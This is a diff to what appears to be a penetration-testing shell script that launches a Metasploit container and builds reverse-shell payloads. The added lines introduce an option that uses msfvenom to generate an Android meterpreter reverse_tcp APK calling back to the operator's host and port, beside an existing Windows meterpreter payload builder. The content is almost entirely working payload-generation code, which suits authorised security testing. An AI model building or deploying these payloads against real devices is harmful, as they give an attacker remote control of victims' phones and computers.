@@ -19,6 +19,10 @@ do
 		u)
 			shellupgradeport=$OPTARG
 			;;
+		a)
+			andpay=1
+			tmuxwindownamebuild=$(echo $tmuxwindownamebuild)" [android]"
+			;;
 		w)
 			winpay=1
 			tmuxwindownamebuild=$(echo $tmuxwindownamebuild)" [win]"
@@ -65,6 +69,14 @@ msf="$(docker run -d -t \
 	pennoser/msf:latest /bin/bash)"
 
 # build basic reverse payloads for host
+if [ -n "$andpay" ]; then
+	docker exec -ti $msf msfvenom \
+		-p "android/meterpreter/reverse_tcp" \
+		"LHOST=$hostip" \
+		"LPORT=$exploitport" \
+		-f "apk" \
+		-o "/pentest/Desktop/shell.apk"
+fi
 if [ -n "$winpay" ]; then
 	docker exec -ti $msf msfvenom \
 		-p "windows/meterpreter/reverse_tcp" \
